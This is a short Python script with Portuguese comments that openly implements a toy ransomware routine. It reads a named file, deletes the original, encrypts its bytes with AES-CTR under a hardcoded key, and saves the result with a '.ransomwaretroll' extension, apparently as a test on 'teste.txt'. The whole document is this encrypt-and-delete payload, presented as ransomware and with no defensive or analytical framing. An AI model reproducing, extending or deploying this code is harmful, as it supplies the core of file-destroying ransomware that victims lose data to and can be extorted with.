import os
import pyaes

def encrypt_file(original_file_name, encryption_key):
    """
    Criptografa um arquivo e salva com uma nova extensão, removendo o original.
    
    :param original_file_name: Nome do arquivo a ser criptografado.
    :param encryption_key: Chave de criptografia (deve ser em bytes).
    """
    try:
        # Ler o arquivo original
        with open(original_file_name, "rb") as original_file:
            file_data = original_file.read()
        
        # Remover o arquivo original
        os.remove(original_file_name)
        
        # Criptografar os dados
        aes = pyaes.AESModeOfOperationCTR(encryption_key)
        encrypted_data = aes.encrypt(file_data)
        
        # Salvar o arquivo criptografado
        encrypted_file_name = original_file_name + ".ransomwaretroll"
        with open(encrypted_file_name, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
        
        print(f"Arquivo '{original_file_name}' foi criptografado com sucesso como '{encrypted_file_name}'.")
    
    except FileNotFoundError:
        print(f"Erro: O arquivo '{original_file_name}' não foi encontrado.")
    except Exception as e:
        print(f"Erro ao processar o arquivo: {e}")

# Parâmetros de entrada
file_to_encrypt = "teste.txt"
encryption_key = b"testeransomwares"

# Chamada da função
encrypt_file(file_to_encrypt, encryption_key)

